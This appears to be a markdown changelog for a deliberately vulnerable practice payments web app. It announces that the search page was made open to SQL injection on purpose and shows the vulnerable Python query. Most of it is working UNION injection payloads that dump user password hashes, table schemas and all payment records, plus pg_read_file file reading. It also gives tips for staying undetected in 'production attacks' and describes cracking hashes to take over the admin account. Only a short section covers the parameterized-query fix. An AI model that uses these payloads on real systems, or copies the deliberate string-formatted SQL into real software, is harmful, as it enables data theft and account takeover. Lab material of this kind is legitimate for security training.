# ✅ NEW FEATURE: Search Page SQL Injection (Multiple Results!)

## 🎉 What's New

The **Search page** (`/search`) is now **vulnerable to SQL injection** and returns **MULTIPLE results at once**!

---

## 🚀 Why This is Better

### Before: Status Page Only

❌ Returns **ONE result** per request  
❌ Need **OFFSET** to iterate through data  
❌ **Multiple requests** to extract a table  
❌ Slow and tedious  

**Example**: Extract 3 users = 3 requests
```
?id=1 UNION ... LIMIT 1 OFFSET 0
?id=1 UNION ... LIMIT 1 OFFSET 1  
?id=1 UNION ... LIMIT 1 OFFSET 2
```

---

### After: Search Page Added! ⭐

✅ Returns **MULTIPLE results** per request  
✅ **NO OFFSET** needed  
✅ **ONE request** extracts entire table  
✅ Fast and efficient!  

**Example**: Extract 3 users = 1 request
```
/search?q=%' UNION SELECT ... FROM users WHERE '1'='1
→ Returns all 3 users at once! 🎉
```

---

## 📊 Comparison Table

| Feature | Status Page `/status` | Search Page `/search` |
|---------|----------------------|----------------------|
| **Results per query** | 1 row | Multiple rows ✅ |
| **Extraction method** | OFFSET iteration | Bulk extraction ✅ |
| **Speed** | Slow (10 requests for 10 rows) | Fast (1 request for 10 rows) ✅ |
| **Payload complexity** | Simple | Slightly more complex |
| **Injection point** | `?id=<payload>` | `?q=<payload>` |
| **URL encoding** | Not needed | `%` needs encoding as `%25` |
| **Best for** | File reading, single queries | Table extraction, bulk data |

---

## 🎯 Quick Examples

### Status Page (Old Way)
```
# Get first user
http://localhost:5000/status?id=1 UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users LIMIT 1 OFFSET 0

# Get second user (separate request!)
http://localhost:5000/status?id=1 UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users LIMIT 1 OFFSET 1

# Get third user (another request!)
http://localhost:5000/status?id=1 UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users LIMIT 1 OFFSET 2
```

**Total**: 3 requests to get 3 users

---

### Search Page (New Way) ⭐
```
# Get ALL users at once!
http://localhost:5000/search?q=%' UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users WHERE '1'='1
```

**Total**: 1 request to get all 3 users! 🚀

---

## 💰 Best Use Cases

### Use Status Page For:
- ✅ **File reading**: `pg_read_file('/tmp/dbconf.ini')`
- ✅ **Directory listing**: `pg_ls_dir('/app')`
- ✅ **Single queries**: Version info, database name
- ✅ **Testing/demos**: Simpler payload structure

### Use Search Page For:
- ✅ **Bulk extraction**: All users, all payments
- ✅ **Schema discovery**: List all columns in one shot
- ✅ **Multiple results**: When you need more than one row
- ✅ **Production attacks**: Fewer requests = less detection

---

## 🔥 Top 3 Search Page Payloads

### 1. Extract All User Credentials (JACKPOT!)
```
/search?q=%' UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users WHERE '1'='1
```

**What you get**:
- alice + password hash
- bob + password hash  
- admin + password hash

All in ONE request! 💰

---

### 2. List All Table Columns (No Iteration!)
```
/search?q=%' UNION SELECT ordinal_position, ordinal_position, column_name, 0.00, data_type, table_name, CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='users' AND '1'='1
```

**What you get**:
7 "payment" rows, each showing one column:
1. id : integer
2. username : character varying
3. email : character varying
4. password_hash : character varying
5. full_name : character varying
6. is_admin : boolean
7. created_at : timestamp

All visible at once! No more OFFSET! 🎯

---

### 3. See ALL Payments from ALL Users
```
/search?q=%' UNION SELECT id, user_id, recipient, amount, description, status, created_at FROM payments WHERE '1'='1
```

**What you get**:
All 23 payment transactions from all 3 users!

Bypasses the `user_id` filter completely! 🔓

---

## 🎓 Technical Details

### The Vulnerability

**Code**:
```python
# VULNERABLE: String formatting with user input
sql = f"SELECT * FROM payments WHERE user_id = {current_user.id} AND (recipient LIKE '%{query}%' OR description LIKE '%{query}%')"
cursor.execute(sql)
```

### The Injection Point

User input goes into LIKE clause:
```sql
... (recipient LIKE '%USER_INPUT%' OR description LIKE '%USER_INPUT%')
```

### Closing the LIKE

Use `%'` to close the LIKE:
```sql
... (recipient LIKE '%%' UNION SELECT ... WHERE '1'='1%' OR description LIKE '%%' UNION SELECT ... WHERE '1'='1%')
```

The `WHERE '1'='1` ensures the rest of the query still parses correctly!

---

## 📚 Documentation

### New Files Created:
- ✅ **docs/SEARCH_PAGE_SQLI.md** - Complete search page guide
- ✅ **QUICK_REFERENCE.md** - Updated with search payloads

### Updated Files:
- ✅ **app.py** - Search page now vulnerable to SQL injection
- ✅ Docker container rebuilt with new code

---

## 🚀 Try It Now!

1. **Login**: http://localhost:5000/login (alice / password123)

2. **Go to Search**: Click "Search Payments" in menu

3. **Try normal search**: Type "Alice" and search (works normally)

4. **Try SQL injection**: Use this payload:
   ```
   %' UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users WHERE '1'='1
   ```

5. **See the magic**: All 3 users with password hashes displayed as "payments"! 🎉

---

## 🎬 Demo Script (3 Minutes)

### Act 1: The Problem (30 seconds)
"Status page only shows ONE result. To extract 10 users, I need 10 requests. That's slow and obvious!"

### Act 2: The Solution (1 minute)
"But the Search page returns MULTIPLE results! Watch this..."

*Paste search payload*

"Boom! All 3 users with password hashes in ONE request!"

### Act 3: The Impact (1.5 minutes)
"With these password hashes, I can:
1. Crack them with hashcat
2. Login as any user
3. Login as ADMIN
4. Take over the entire system

All from ONE SQL injection on the search page! This is why bulk extraction is so dangerous!"

---

## 🛡️ Defense

### How to Fix

**VULNERABLE**:
```python
sql = f"SELECT * FROM payments WHERE user_id = {current_user.id} AND (recipient LIKE '%{query}%' OR description LIKE '%{query}%')"
```

**SECURE**:
```python
search_pattern = f"%{query}%"
cursor.execute(
    "SELECT * FROM payments WHERE user_id = %s AND (recipient LIKE %s OR description LIKE %s)",
    (current_user.id, search_pattern, search_pattern)
)
```

**Key**: Use **parameterized queries** with `%s` placeholders!

---

## 📊 Impact Summary

### Search Page Advantages:
- ⚡ **10x faster** data extraction
- 🎯 **Zero iteration** needed (no OFFSET)
- 🔓 **Bulk exfiltration** in single request
- 🥷 **Stealthier** (fewer requests = harder to detect)
- 💰 **Higher value** (complete table dumps)

### When to Use Which:

| Task | Best Endpoint |
|------|--------------|
| Read config files | Status page |
| List directories | Status page |
| Extract 1-2 rows | Status page |
| Extract entire tables | Search page ✅ |
| Get all columns | Search page ✅ |
| Bypass filters | Search page ✅ |
| Speed matters | Search page ✅ |

---

## 🎯 Key Takeaway

> The Search page turns SQL injection from a **slow, iterative attack** into a **fast, bulk extraction**!

**Before**: 23 requests to get all payments  
**After**: 1 request to get all payments  

**23x faster!** 🚀

---

**Status**: ✅ Implemented and tested  
**Containers**: ✅ Rebuilt and running  
**Documentation**: ✅ Complete  
**Impact**: 🔥 HIGH - Dramatically improves attack efficiency
